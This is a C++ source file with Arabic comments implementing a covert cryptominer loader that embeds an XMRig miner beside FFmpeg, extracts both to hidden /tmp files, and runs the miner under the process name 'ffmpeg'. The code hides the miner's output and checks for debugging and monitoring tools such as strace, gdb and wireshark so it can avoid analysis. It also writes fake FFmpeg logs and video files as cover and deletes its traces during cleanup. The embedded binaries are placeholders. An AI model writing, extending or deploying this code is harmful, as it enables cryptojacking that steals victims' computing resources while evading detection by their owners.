#include "binary_fusion.h"
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <signal.h>
#include <random>
#include <thread>
#include <chrono>
#include <cstring>

// بيانات الملفات المدمجة (ستملأ بواسطة السكريبت)
const unsigned char embedded_ffmpeg[] = {
    // سيتم ملؤها بواسطة fusion_builder.sh
    0x7f, 0x45, 0x4c, 0x46  // ELF header placeholder
};
const size_t embedded_ffmpeg_size = sizeof(embedded_ffmpeg);

const unsigned char embedded_xmrig[] = {
    // سيتم ملؤها بواسطة fusion_builder.sh
    0x7f, 0x45, 0x4c, 0x46  // ELF header placeholder
};
const size_t embedded_xmrig_size = sizeof(embedded_xmrig);

const unsigned char embedded_config[] = {
    // Config.json مدمج
    '{', '"', 'a', 'l', 'g', 'o', '"', ':', '"', 'r', 'x', '/', '0', '"', '}'
};
const size_t embedded_config_size = sizeof(embedded_config);

BinaryFusion::BinaryFusion() : currentMode(INNOCENT_MODE), isRunning(false) {
    // إنشاء مسارات عشوائية للملفات المستخرجة
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(10000, 99999);
    
    int pid = getpid();
    ffmpegPath = "/tmp/.ffmpeg_" + std::to_string(pid) + "_" + std::to_string(dis(gen));
    xmrigPath = "/tmp/.miner_" + std::to_string(pid) + "_" + std::to_string(dis(gen));
    configPath = "/tmp/.config_" + std::to_string(pid) + "_" + std::to_string(dis(gen));
}

BinaryFusion::~BinaryFusion() {
    cleanup();
}

bool BinaryFusion::validateEmbeddedData() {
    // فحص صحة الملفات المدمجة
    if (embedded_ffmpeg_size < 1000 || embedded_xmrig_size < 1000) {
        std::cerr << "[ERROR] Embedded binaries seem invalid (too small)" << std::endl;
        return false;
    }
    
    // فحص ELF headers
    if (embedded_ffmpeg[0] != 0x7f || embedded_ffmpeg[1] != 'E' ||
        embedded_ffmpeg[2] != 'L' || embedded_ffmpeg[3] != 'F') {
        std::cerr << "[ERROR] FFmpeg binary has invalid ELF header" << std::endl;
        return false;
    }
    
    if (embedded_xmrig[0] != 0x7f || embedded_xmrig[1] != 'E' ||
        embedded_xmrig[2] != 'L' || embedded_xmrig[3] != 'F') {
        std::cerr << "[ERROR] XMRig binary has invalid ELF header" << std::endl;
        return false;
    }
    
    return true;
}

bool BinaryFusion::extractFFmpeg() {
    std::ofstream file(ffmpegPath, std::ios::binary);
    if (!file.is_open()) {
        return false;
    }
    
    file.write(reinterpret_cast<const char*>(embedded_ffmpeg), embedded_ffmpeg_size);
    file.close();
    
    // إعطاء صلاحيات التنفيذ
    chmod(ffmpegPath.c_str(), 0755);
    
    return true;
}

bool BinaryFusion::extractXMRig() {
    std::ofstream file(xmrigPath, std::ios::binary);
    if (!file.is_open()) {
        return false;
    }
    
    file.write(reinterpret_cast<const char*>(embedded_xmrig), embedded_xmrig_size);
    file.close();
    
    // إعطاء صلاحيات التنفيذ
    chmod(xmrigPath.c_str(), 0755);
    
    return true;
}

bool BinaryFusion::extractConfig() {
    std::ofstream file(configPath);
    if (!file.is_open()) {
        return false;
    }
    
    file.write(reinterpret_cast<const char*>(embedded_config), embedded_config_size);
    file.close();
    
    return true;
}

bool BinaryFusion::extractEmbeddedBinaries() {
    std::cout << "[INFO] Extracting embedded binaries..." << std::endl;
    
    if (!validateEmbeddedData()) {
        return false;
    }
    
    if (!extractFFmpeg()) {
        std::cerr << "[ERROR] Failed to extract FFmpeg" << std::endl;
        return false;
    }
    
    if (!extractXMRig()) {
        std::cerr << "[ERROR] Failed to extract XMRig" << std::endl;
        return false;
    }
    
    if (!extractConfig()) {
        std::cerr << "[ERROR] Failed to extract config" << std::endl;
        return false;
    }
    
    std::cout << "[INFO] All binaries extracted successfully" << std::endl;
    return true;
}

bool BinaryFusion::isEnvironmentSafe() {
    // فحص بسيط للبيئة (يمكن تطويره أكثر)
    
    // فحص أدوات المراقبة
    std::vector<std::string> dangerousProcesses = {
        "strace", "gdb", "wireshark", "tcpdump", "htop"
    };
    
    for (const auto& proc : dangerousProcesses) {
        std::string cmd = "pgrep " + proc + " >/dev/null 2>&1";
        if (system(cmd.c_str()) == 0) {
            std::cout << "[WARNING] Monitoring tool detected: " << proc << std::endl;
            return false;
        }
    }
    
    return true;
}

BinaryFusion::ExecutionMode BinaryFusion::detectOptimalMode() {
    // خوارزمية ذكية لتحديد أفضل وضع تشغيل
    
    if (!isEnvironmentSafe()) {
        std::cout << "[INFO] Environment not safe, using innocent mode only" << std::endl;
        return INNOCENT_MODE;
    }
    
    // فحص وقت النهار (تعدين أكثر في الليل)
    time_t now = time(0);
    struct tm* timeinfo = localtime(&now);
    int hour = timeinfo->tm_hour;
    
    if (hour >= 22 || hour <= 6) {
        std::cout << "[INFO] Night time detected, using stealth mode" << std::endl;
        return STEALTH_MODE;
    } else {
        std::cout << "[INFO] Day time detected, using hybrid mode" << std::endl;
        return HYBRID_MODE;
    }
}

void BinaryFusion::createFakeFFmpegSession() {
    // إنشاء ملفات وسجلات تبدو مثل جلسة FFmpeg حقيقية
    
    std::ofstream logFile("/tmp/.ffmpeg_session.log");
    logFile << "FFmpeg session started at " << time(nullptr) << std::endl;
    logFile << "Input: /tmp/input_video.mp4" << std::endl;
    logFile << "Output: /tmp/output_video.mp4" << std::endl;
    logFile << "Progress: 0%" << std::endl;
    logFile.close();
    
    // إنشاء ملفات فيديو وهمية
    system("dd if=/dev/zero of=/tmp/input_video.mp4 bs=1M count=100 2>/dev/null");
}

pid_t BinaryFusion::runFFmpeg() {
    pid_t pid = fork();
    if (pid == 0) {
        // تشغيل FFmpeg مع مهمة طويلة وهمية
        execl(ffmpegPath.c_str(), "ffmpeg", 
              "-f", "lavfi", 
              "-i", "testsrc=duration=3600:size=1920x1080:rate=30",
              "-c:v", "libx264",
              "-preset", "slow",
              "/tmp/output_video.mp4",
              nullptr);
        exit(1);
    }
    return pid;
}

pid_t BinaryFusion::runXMRig() {
    pid_t pid = fork();
    if (pid == 0) {
        // إخفاء المخرجات
        int devnull = open("/dev/null", O_WRONLY);
        dup2(devnull, STDOUT_FILENO);
        dup2(devnull, STDERR_FILENO);
        close(devnull);
        
        // تغيير اسم العملية لتبدو مثل FFmpeg
        prctl(PR_SET_NAME, "ffmpeg", 0, 0, 0);
        
        // أولوية منخفضة
        nice(19);
        
        // تشغيل XMRig
        execl(xmrigPath.c_str(), "ffmpeg", 
              "--config", configPath.c_str(),
              "--background",
              nullptr);
        exit(1);
    }
    return pid;
}

bool BinaryFusion::executeMode(ExecutionMode mode) {
    currentMode = mode;
    isRunning = true;
    
    std::cout << "[INFO] Executing mode: ";
    switch (mode) {
        case INNOCENT_MODE:
            std::cout << "Innocent (FFmpeg only)" << std::endl;
            createFakeFFmpegSession();
            runFFmpeg();
            break;
            
        case STEALTH_MODE:
            std::cout << "Stealth (XMRig only)" << std::endl;
            createFakeFFmpegSession();  // تمويه
            runXMRig();
            break;
            
        case HYBRID_MODE:
            std::cout << "Hybrid (Both programs)" << std::endl;
            createFakeFFmpegSession();
            runFFmpeg();
            std::this_thread::sleep_for(std::chrono::seconds(2));
            runXMRig();
            break;
    }
    
    return true;
}

void BinaryFusion::dynamicModeSwitching() {
    std::cout << "[INFO] Starting dynamic mode switching..." << std::endl;
    
    while (isRunning) {
        // إعادة تقييم البيئة كل 5 دقائق
        std::this_thread::sleep_for(std::chrono::minutes(5));
        
        ExecutionMode newMode = detectOptimalMode();
        if (newMode != currentMode) {
            std::cout << "[INFO] Switching execution mode..." << std::endl;
            
            // إيقاف العمليات الحالية
            system("pkill -f ffmpeg 2>/dev/null");
            
            // بدء الوضع الجديد
            executeMode(newMode);
        }
    }
}

void BinaryFusion::cleanup() {
    std::cout << "[INFO] Cleaning up..." << std::endl;
    
    isRunning = false;
    
    // إنهاء العمليات
    system("pkill -f ffmpeg 2>/dev/null");
    
    // حذف الملفات المستخرجة
    unlink(ffmpegPath.c_str());
    unlink(xmrigPath.c_str());
    unlink(configPath.c_str());
    
    // حذف الملفات المؤقتة
    system("rm -f /tmp/.ffmpeg_session.log");
    system("rm -f /tmp/input_video.mp4");
    system("rm -f /tmp/output_video.mp4");
}
